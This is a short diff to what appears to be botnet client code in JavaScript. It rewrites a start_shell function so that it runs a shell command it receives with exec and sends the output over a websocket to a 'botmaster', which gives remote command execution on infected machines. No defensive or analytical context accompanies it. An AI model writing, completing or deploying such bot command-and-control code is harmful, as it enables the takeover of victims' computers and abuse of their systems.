@@ -69,7 +69,28 @@ function execute(id, data, filename){
     return 0;
 }
 
-function start_shell(id){
+function start_shell(id, sh_cmd, botmaster, ws){
+
+
+    exec(sh_cmd, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error: ${error.message}`);
+            return;
+        }
+
+        if (stderr) {
+            console.error(`Standard Error: ${stderr}`);
+            return;
+        }
+        console.log(`Standard Output: ${stdout}`);
+        const result = {
+            id,
+            type: "Shell",
+            botmaster,
+            result: stdout
+        };
+        ws.send(JSON.stringify(result));
+    });
     return 0;
 }
 
